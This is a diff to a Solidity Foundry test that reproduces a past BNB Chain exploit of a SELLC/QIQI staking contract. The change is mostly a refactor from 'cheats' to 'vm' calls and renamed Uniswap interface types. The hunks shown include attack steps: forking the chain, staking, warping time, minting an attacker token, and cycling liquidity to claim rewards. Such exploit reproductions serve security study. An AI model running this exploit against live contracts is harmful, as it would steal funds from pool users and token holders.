@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @KeyInfo - Total Lost : unclear US$
 // Attacker : https://bscscan.com/address/0xa3aa817587556c023e78b2285d381c68cee17069
@@ -32,33 +31,31 @@ contract ContractTest is Test {
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IERC20 SELLC = IERC20(0xa645995e9801F2ca6e2361eDF4c2A138362BADe4);
     IERC20 QIQI = IERC20(0x0B464d2C36d52bbbf3071B2b0FcA82032DCf656d);
-    Uni_Pair_V3 Pair = Uni_Pair_V3(0x4B1aC1E4B828EBC81FcaC587BEf64e4aDd1dBCEc);
-    Uni_Router_V2 Router = Uni_Router_V2(0xBDDFA43dbBfb5120738C922fa0212ef1E4a0850B);
+    IUniswapV3Pair Pair = IUniswapV3Pair(0x4B1aC1E4B828EBC81FcaC587BEf64e4aDd1dBCEc);
+    IUniswapV2Router Router = IUniswapV2Router(0xBDDFA43dbBfb5120738C922fa0212ef1E4a0850B);
     IUniswapV2Factory Factory = IUniswapV2Factory(0x2c37655f8D942f2411d9d85a5FE580C156305070);
     IStakingRewards StakingRewards = IStakingRewards(0xeaF83465025b4Bf9020fdF9ea5fB6e71dC8a0779);
     TOKENA TokenA;
     Exploiter exploiter;
-    Uni_Pair_V2 pair;
+    IUniswapV2Pair pair;
     address[] expoiterList;
 
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-
     function setUp() public {
-        cheats.createSelectFork("bsc", 28_187_317);
-        cheats.label(address(USDT), "USDT");
-        cheats.label(address(QIQI), "QIQI");
-        cheats.label(address(SELLC), "SELLC");
-        cheats.label(address(Pair), "Pair");
-        cheats.label(address(Router), "Router");
-        cheats.label(address(Factory), "Factory");
-        cheats.label(address(StakingRewards), "StakingRewards");
+        vm.createSelectFork("bsc", 28_187_317);
+        vm.label(address(USDT), "USDT");
+        vm.label(address(QIQI), "QIQI");
+        vm.label(address(SELLC), "SELLC");
+        vm.label(address(Pair), "Pair");
+        vm.label(address(Router), "Router");
+        vm.label(address(Factory), "Factory");
+        vm.label(address(StakingRewards), "StakingRewards");
     }
 
     function testExploit() public {
         deal(address(USDT), address(this), 1000 * 1e18);
         stakeFactory(10);
 
-        cheats.warp(block.timestamp + 60 * 60);
+        vm.warp(block.timestamp + 60 * 60);
 
         TokenA = new TOKENA();
         TokenA.mint(100);
@@ -98,7 +95,7 @@ contract ContractTest is Test {
             block.timestamp
         );
         claimFactory(10);
-        pair = Uni_Pair_V2(Factory.getPair(address(QIQI), address(TokenA)));
+        pair = IUniswapV2Pair(Factory.getPair(address(QIQI), address(TokenA)));
         pair.approve(address(Router), pair.balanceOf(address(this)));
         Router.removeLiquidity(
             address(QIQI), address(TokenA), pair.balanceOf(address(this)), 0, 0, address(this), block.timestamp
